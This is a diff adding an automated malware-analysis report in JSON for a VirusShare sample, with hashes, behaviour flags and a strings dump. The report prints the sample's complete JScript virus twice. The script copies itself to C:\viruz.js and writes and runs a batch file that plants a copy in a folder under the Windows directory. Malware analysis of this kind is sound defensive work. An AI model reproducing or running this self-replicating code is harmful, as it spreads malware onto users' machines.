@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "var fso=WScript.CreateObject(\"Scripting.FileSystemObject\")\nvar MySf=fso.OpenTextFile(WScript.ScriptFullName,1)\nvar MySC=MySf.ReadAll()\nvar WSHShell = WScript.CreateObject(\"WScript.Shell\");\nMySf.Close()\nMyS=fso.CreateTextFile(\"C:\\viruz.js\");\nMyS.WriteLine(MySC);\nMyS.Close();\n\nvar wsh = WScript.CreateObject(\"WScript.Shell\");\ndosfile=fso.CreateTextFile(\"C:\\dosfile.bat\");\ndosfile.WriteLine(\"@echo off\");\ndosfile.WriteLine(\"cd %windir%\");\ndosfile.WriteLine(\"md \u0173\u0173\");\ndosfile.WriteLine(\"cd \u0173\u0173\");\ndosfile.WriteLine(\"copy C:\\viruz.js viruz.js\");\ndosfile.Close();\nwsh.Run(\"C:\\dosfile.bat\");"
+    },
+    "filename": "VirusShare_3339b287b68c4e7240ea3ea8274e49cd",
+    "filesize": 605,
+    "filetype": "UTF-8 Unicode text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3339b287b68c4e7240ea3ea8274e49cd",
+        "sha1": "ada53cb73914f89660956614adfda31a5b6b8a22",
+        "sha256": "5fefb69cd2c9e792aa39e1dfadd15fb737082675a5df230ce680d9423d4e828d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "var fso=WScript.CreateObject(\"Scripting.FileSystemObject\")",
+            "var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)",
+            "var MySC=MySf.ReadAll()",
+            "var WSHShell = WScript.CreateObject(\"WScript.Shell\");",
+            "MySf.Close()",
+            "MyS=fso.CreateTextFile(\"C:\\viruz.js\");",
+            "MyS.WriteLine(MySC);",
+            "MyS.Close();",
+            "var wsh = WScript.CreateObject(\"WScript.Shell\");",
+            "dosfile=fso.CreateTextFile(\"C:\\dosfile.bat\");",
+            "dosfile.WriteLine(\"@echo off\");",
+            "dosfile.WriteLine(\"cd %windir%\");",
+            "dosfile.WriteLine(\"md \u0173\u0173\");",
+            "dosfile.WriteLine(\"cd \u0173\u0173\");",
+            "dosfile.WriteLine(\"copy C:\\viruz.js viruz.js\");",
+            "dosfile.Close();",
+            "wsh.Run(\"C:\\dosfile.bat\");"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274589",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
